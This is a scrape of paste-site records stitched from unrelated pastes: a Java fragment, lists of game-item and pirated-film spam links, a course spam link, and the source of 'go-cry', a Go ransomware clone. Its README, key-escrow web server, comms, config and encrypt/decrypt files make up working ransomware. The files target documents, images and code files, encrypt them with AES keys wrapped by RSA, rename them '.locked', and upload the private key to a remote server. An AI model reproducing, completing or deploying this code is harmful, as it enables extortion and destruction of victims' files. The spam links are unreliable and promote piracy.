        var ct = new ComposedTask(""ct"", new SimpleTask[]{st1, st2});
        var p = new Processor(new Task[]{ct});
        System.out.println(p);
        p.finishAllTasks();
        System.out.println(p);
    }
}
"
29q262cu,Untitled,Locative,SQL,Sunday 17th of December 2023 09:52:19 AM CDT,"Список  предметов: 
https://db.pandawow.me/?item=133543
https://db.pandawow.me/?item=118676
https://db.pandawow.me/?item=129923
https://db.pandawow.me/?item=116771
https://db.pandawow.me/?item=166775
https://db.pandawow.me/?item=137573
https://db.pandawow.me/?item=138387

https://db.pandawow.me/?item=113011
https://db.pandawow.me/?item=113007
https://db.pandawow.me/?item=113004
https://db.pandawow.me/?item=113024
https://db.pandawow.me/?item=113035
https://db.pandawow.me/?item=113047
https://db.pandawow.me/?item=113090
https://db.pandawow.me/?item=113087
https://db.pandawow.me/?item=113083
https://db.pandawow.me/?item=113077

https://db.pandawow.me/?item=84101
https://db.pandawow.me/?item=87791
https://db.pandawow.me/?item=44175
https://db.pandawow.me/?item=45801
https://db.pandawow.me/?item=54860
https://db.pandawow.me/?item=46778
https://db.pandawow.me/?item=49283
https://db.pandawow.me/?item=52200
https://db.pandawow.me/?item=76755
https://db.pandawow.me/?item=71718
https://db.pandawow.me/?item=85870
https://db.pandawow.me/?item=78924
https://db.pandawow.me/?item=78919

https://db.pandawow.me/?item=38301
https://db.pandawow.me/?item=44719
https://db.pandawow.me/?item=38578
https://db.pandawow.me/?item=46780
https://db.pandawow.me/?item=49703
https://db.pandawow.me/?item=52253
https://db.pandawow.me/?item=52201
https://db.pandawow.me/?item=52251
https://db.pandawow.me/?item=52489
https://db.pandawow.me/?item=64488
https://db.pandawow.me/?item=72161
https://db.pandawow.me/?item=69776
https://db.pandawow.me/?item=70159
https://db.pandawow.me/?item=86574
https://db.pandawow.me/?item=88566
https://db.pandawow.me/?item=90067
https://db.pandawow.me/?item=33079
https://db.pandawow.me/?item=33219
https://db.pandawow.me/?item=32542
https://db.pandawow.me/?item=35227

https://db.pandawow.me/?item=95474
https://db.pandawow.me/?item=95475
https://db.pandawow.me/?item=97213

https://db.pandawow.me/?item=87526
https://db.pandawow.me/?item=89686
https://db.pandawow.me/?item=90173
https://db.pandawow.me/?item=90897
https://db.pandawow.me/?item=90953
https://db.pandawow.me/?item=85220
https://db.pandawow.me/?item=60847
https://db.pandawow.me/?item=22780
https://db.pandawow.me/?item=20651
https://db.pandawow.me/?item=46892
https://db.pandawow.me/?item=62540
https://db.pandawow.me/?item=64996
https://db.pandawow.me/?item=66067
https://db.pandawow.me/?item=68385
https://db.pandawow.me/?item=69847
https://db.pandawow.me/?item=69239
https://db.pandawow.me/?item=69251
https://db.pandawow.me/?item=68840
https://db.pandawow.me/?item=70140
https://db.pandawow.me/?item=70099
https://db.pandawow.me/?item=69992
https://db.pandawow.me/?item=70160
https://db.pandawow.me/?item=71726
https://db.pandawow.me/?item=79744
https://db.pandawow.me/?item=78916"
5Z2TXfTK,Untitled,sissou123,Python,Sunday 17th of December 2023 09:22:54 AM CDT,"The Data Science Course: Complete Data Science Bootcamp 2023
Complete Data Science Training: Mathematics, Statistics, Python, Advanced Statistics in Python, Machine & Deep Learning
for more:https://dz-linkk.com/CJtUKw"
bqr57NKP,dbftnfn,gadungw71,PHP,Sunday 17th of December 2023 09:13:12 AM CDT,"https://groups.google.com/g/erterdgh/c/-2GZ0Pei4R4
https://groups.google.com/g/alt.windows-xp/c/Z0TdIAZGsgg
https://www.taskade.com/p/izle-nefes-yer-eksi-iki-full-filmler-online-hd-1080-p-01HHTZ7T39A1QFXXM80E0EW6X0
https://baskadia.com/post/1q82s
https://vk.com/@piscesarya-tum-film-nefes-yer-eksi-iki-izle-2023-turkce-dublaj-full-h
https://vk.com/@blogchinemax-nefes-yer-eksi-iki-filmi-full-izle-2023-bihter-1080p-turkce
https://vk.com/@mopieboxoffice-filmi-izle-nefes-yer-eksi-iki-2023-tam-surum-turkce-altyazl
https://groups.google.com/a/chromium.org/g/chromium-reviews/c/Xc2D4C4XrhU
https://groups.google.com/g/comp.os.minix/c/nu4CTglDlsM
https://www.taskade.com/p/izle-filmleri-nefes-yer-eksi-iki-full-filmler-online-hd-1080-p-01HHV039QPA8EGRZYJKX330B3E
https://baskadia.com/post/1q8af
https://groups.google.com/g/alt.windows-xp/c/jDXWbrZ-rew
https://groups.google.com/a/chromium.org/g/chromium-reviews/c/aVXOd_L2sqw
https://groups.google.com/g/comp.os.minix/c/MXtSfPWg_pI
https://www.taskade.com/p/tuem-film-oeluemlue-duenya-2-2023-tuerkce-dublaj-full-hd-izle-01HHV1RT1PA52MF0P5GCR37XAM
https://baskadia.com/post/1q8qs
https://vk.com/@chinahade-film-olumlu-dunya-2-2023-stream-turkce-dublaj-tum-film
https://vk.com/@watchstylleronline-izle-filmleri-olumlu-dunya-2-full-filmler-online-hd-1080p
https://groups.google.com/g/alt.windows-xp/c/_yq0QGv7iU4
https://groups.google.com/a/chromium.org/g/chromium-reviews/c/yNpsxq4Fgtk
https://groups.google.com/g/comp.os.minix/c/q8ggqOxUnNE
https://vk.com/@optimummm-film-murat-gogebakan-kalbim-yaral-2023-stream-turkce-dublaj
https://vk.com/@filmchinemax-murat-gogebakan-kalbim-yaral-filmi-tam-surum-2023hd-turkce-d
https://vk.com/@674475936-murat-gogebakan-kalbim-yaral-2023-film-izle-turkce-dublaj-fu
https://baskadia.com/post/1qihs
https://groups.google.com/g/esdgfg/c/asJmV9kknZQ
https://groups.google.com/g/comp.os.linux.misc/c/rKoEy_ycyWk
https://groups.google.com/g/alt.windows-xp/c/SRNQ3B3YHWU"
iQ2ndYPY,README,FlyFar,Email,Sunday 17th of December 2023 09:05:43 AM CDT,"go-cry
some do not seem to understand that this is not even close to being complete, and manage to build a system that processes payments for this then you are probably able to write this on their own. I could say that this was a program that encrypts some of your files and stores it on a server and you would not bother

This project was written to show how easy it is to create extremely malicious code.

Ransomware is designed to take your most loved files hostage demanding large amounts of money to unlock them.

Clone of native-tear written in Go which is a clone of hidden-tear

Building
go-cry consists of two parts, a webserver and the client software. Output files will be placed in ./bin/

Built with linker flags -w -s to minimize file size. To further reduce the size of Go binaries, please see the UPX project

Building client and webserver
$ make
Will create the files

./bin/web[.exe]
./bin/cry[.exe]
Building clients for all common operating systems and architectures
$ make all
Will create the files

./bin/windows_amd64.exe
./bin/windows_x86.exe
./bin/linux_amd64
./bin/linux_x86
./bin/macos (amd64)
Cleaning
Will remove all files in the bin directory

$ make clean
Configuring
Web server
See web/web.go and modify the constant values. They are commented and straightforward.

Client
See config.go and modify the constant values.

If modifying the RSA key size variable Bits, please see EncryptedHeaderSize. RSA ciphertext length changes depending on key size used and it is not calculated at runtime.

This program does not:
Demand any money from the user. It simply encrypts the number of files specified in config.go constant ProcessMax and sends it to the server. Encrypt your files and store your encryption key on your server.
"
7tqQtU6E,web/web.go,FlyFar,Go,Sunday 17th of December 2023 09:04:33 AM CDT,"package main

import (
	""fmt""
	""log""
	""net/http""
)

const (
	// Address server listening address
	Address = "":1312""

	// UploadRoute key uploading path
	UploadRoute = ""/upload""

	// RetrievalRoute
	RetrievalRoute = ""/retrieve""
)

// Pair private key and computer id
type Pair struct {
	Id  string
	Key string
}

// Keys stored in memory
var Keys = []Pair{}

func main() {
	http.HandleFunc(UploadRoute, handleUpload)
	http.HandleFunc(RetrievalRoute, handleRetrieve)

	fmt.Println(""Listening on"", Address)
	log.Fatal(http.ListenAndServe(Address, nil))
}

func reject(w http.ResponseWriter, r *http.Request, reason string) {
	fmt.Println(""Rejecting "", r.RemoteAddr+"":"", reason)
	w.WriteHeader(http.StatusNotFound)
	fmt.Fprint(w, http.StatusText(http.StatusNotFound))
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
	id := r.PostFormValue(""i"")
	key := r.PostFormValue(""k"")

	if r.Method != ""POST"" {
		reject(w, r, ""HTTP method is not POST, got ""+r.Method)
		return
	}

	if id == """" {
		reject(w, r, ""id parameter i not set or empty"")
		return
	}

	if key == """" {
		reject(w, r, ""key parameter k is not set or empty"")
	}

	for _, pair := range Keys {
		if pair.Id == id {
			reject(w, r, ""key already exists"")
			return
		}
	}

	pair := Pair{Id: id, Key: key}
	Keys = append(Keys, pair)
}

func handleRetrieve(w http.ResponseWriter, r *http.Request) {
	id := r.PostFormValue(""i"")

	if r.Method != ""POST"" {
		reject(w, r, ""HTTP method is not POST, got ""+r.Method)
		return
	}

	if id == """" {
		reject(w, r, ""id parameter i is not set"")
		return
	}

	for _, pair := range Keys {
		if pair.Id == id {
			fmt.Fprint(w, pair.Key)
			return
		}
	}

	reject(w, r, ""no key found for id ""+id)
}"
43VG7y45,comms.go,FlyFar,Go,Sunday 17th of December 2023 09:03:59 AM CDT,"package main

import (
	""crypto/rsa""
	""io""
	""net/http""
	""net/url""
)

// PostKey sends the private key to the remote serrver
func PostKey(priv *rsa.PrivateKey, id string) error {
	key := Stringify(priv)

	_, err := http.PostForm(UploadEndpoint, url.Values{
		""k"": {key},
		""i"": {id},
	})

	return err
}

func GetKey(id string) (*rsa.PrivateKey, error) {
	req, err := http.PostForm(RetrieveEndpoint, url.Values{
		""i"": {id},
	})

	if err != nil {
		return nil, err
	}

	key := make([]byte, req.ContentLength)

	io.ReadFull(req.Body, key)

	priv, err := DecodeKey(key)

	return priv, err
}"
2Zsbzzrd,comms_test.go,FlyFar,Go,Sunday 17th of December 2023 09:03:17 AM CDT,"package main

import (
	""fmt""
	""testing""
)

func TestComms(t *testing.T) {
	fmt.Println(""Generating key..."")

	priv := Generate()
	str := Stringify(priv)
	fmt.Println(str)

	fmt.Println(""Uploading..."")
	err := PostKey(priv)

	if err != nil {
		panic(err)
	}

	fmt.Println(""Key uploaded"")

	fmt.Println(""Retrieving key..."")
	priv, err = GetKey()

	if err != nil {
		panic(err)
	}

	fmt.Println(Stringify(priv))
}

func TestServer(t *testing.T) {
	fmt.Println(""Sending the same key twice..."")
	priv := Generate()
	PostKey(priv)
	PostKey(priv)
}"
T4KD9qpa,config.go,FlyFar,Go,Sunday 17th of December 2023 09:02:02 AM CDT,"package main

// Extensions to walk
var Extensions = [...]string{
	""txt"",
	""doc"",
	""docx"",
	""xls"",
	""xlsx"",
	""ppt"",
	""pptx"",
	""odt"",
	""jpg"",
	""png"",
	""csv"",
	""sql"",
	""mdb"",
	""sln"",
	""php"",
	""asp"",
	""aspx"",
	""html"",
	""xml"",
	""psd"",
}

// IgnoreDirs will skip directories that contains the string
var IgnoreDirs = [...]string{
	""AppData"",
	""."",
}

const (
	// LockedExtension to append to file name when encrypted
	LockedExtension = "".locked""

	// ProcessMax X files, then stop
	ProcessMax int = 1

	// KeySize in bytes (AES-256)
	KeySize int = 32

	// Bits Keypair bit size (higher = exponentially slower)
	Bits int = 1024

	// EncryptedHeaderSize I don't know how to calculate the length of RSA ciphertext, but with KeySize + aes.BlockSize it'll be 128 bytes
	// Check this if changing AES keysize or RSA bit size
	EncryptedHeaderSize int = 128

	// Endpoint web server URL
	UploadEndpoint = ""http://localhost:1312/upload""

	RetrieveEndpoint = ""http://localhost:1312/retrieve""
)"
cNYLBPbi,crypto_test.go,FlyFar,Go,Sunday 17th of December 2023 09:01:33 AM CDT,"package main

import (
	""testing""
)

func TestCrypto(t *testing.T) {
	file := ""test.docx""
	priv := Generate()

	encrypt(file, priv)
	decrypt(file+LockedExtension, priv)
}"
Z90mdxUd,decrypt.go,FlyFar,Go,Sunday 17th of December 2023 09:00:54 AM CDT,"package main

import (
	""crypto/aes""
	""crypto/cipher""
	""crypto/rand""
	""crypto/rsa""
	""io/ioutil""

	""crypto/sha256""

	""strings""
)

func decrypt(file string, priv *rsa.PrivateKey) {
	data, err := ioutil.ReadFile(file)

	if err != nil {
		panic(err)
	}

	header := data[:EncryptedHeaderSize]
	label := []byte("""")

	header, err = rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, header, label)

	if err != nil {
		panic(err)
	}

	key := header[:KeySize]
	iv := header[KeySize : KeySize+aes.BlockSize]

	data = data[EncryptedHeaderSize:]

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	cipher := cipher.NewCFBDecrypter(block, iv)
	cipher.XORKeyStream(data, data)

	if strings.HasSuffix(file, LockedExtension) {
		file = file[:len(file)-len(LockedExtension)]
	}

	ioutil.WriteFile(file, data, 0777) // TODO
}"
htq32aQr,encrypt.go,FlyFar,Go,Sunday 17th of December 2023 09:00:24 AM CDT,"package main

import (
	""crypto/rsa""
	""io/ioutil""

	""crypto/aes""
	""crypto/rand""

	""crypto/cipher""

	""crypto/sha256""
)

func encrypt(file string, priv *rsa.PrivateKey) {
	data, err := ioutil.ReadFile(file)

	if err != nil {
		panic(err)
	}

	key := make([]byte, KeySize)
	rand.Read(key)

	iv := make([]byte, aes.BlockSize)
	rand.Read(iv)

	header := append(key, iv...)
	pub := priv.PublicKey

	label := []byte("""")
	header, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, &pub, header, label)

	if err != nil {
		panic(err)
	}

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	cipher := cipher.NewCFBEncrypter(block, iv)
	cipher.XORKeyStream(data, data)

	data = append(header, data...)

	ioutil.WriteFile(file+LockedExtension, data, 0777)
}"
vW0VEibn,home_unix.go,FlyFar,Go,Sunday 17th of December 2023 08:59:58 AM CDT,"// +build !windows

package main

import (
	""os""
)

func GetHomeDir() string {
	return os.Getenv(""HOME"")
}"
JzUymvWV,home_windows.go,FlyFar,Go,Sunday 17th of December 2023 08:59:21 AM CDT,"package main

import (
	""os""
)

func GetHomeDir() string {
	home := os.Getenv(""HOMEDRIVE"") + os.Getenv(""HOMEPATH"")

	if home == """" {
		home = os.Getenv(""USERPROFILE"")
	}

	return home
}"
dqCSfJMw,keys.go,FlyFar,Go,Sunday 17th of December 2023 08:58:42 AM CDT,"package main

import (
	""crypto/rand""
	""crypto/rsa""
	""crypto/x509""
	""encoding/pem""
)

// Generate new RSA keypair
func Generate() *rsa.PrivateKey {
	priv, err := rsa.GenerateKey(rand.Reader, Bits)

	if err != nil {
		panic(err)
	}

	return priv
}

// Stringify private key
func Stringify(priv *rsa.PrivateKey) string {
	privateKeyDer := x509.MarshalPKCS1PrivateKey(priv)
	privateKeyBlock := pem.Block{
		Type:    ""RSA PRIVATE KEY"",
		Headers: nil,
		Bytes:   privateKeyDer,
	}

	return string(pem.EncodeToMemory(&privateKeyBlock))
}

// DecodeKey
func DecodeKey(key []byte) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode([]byte(key))

	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)

	return priv, err
}"
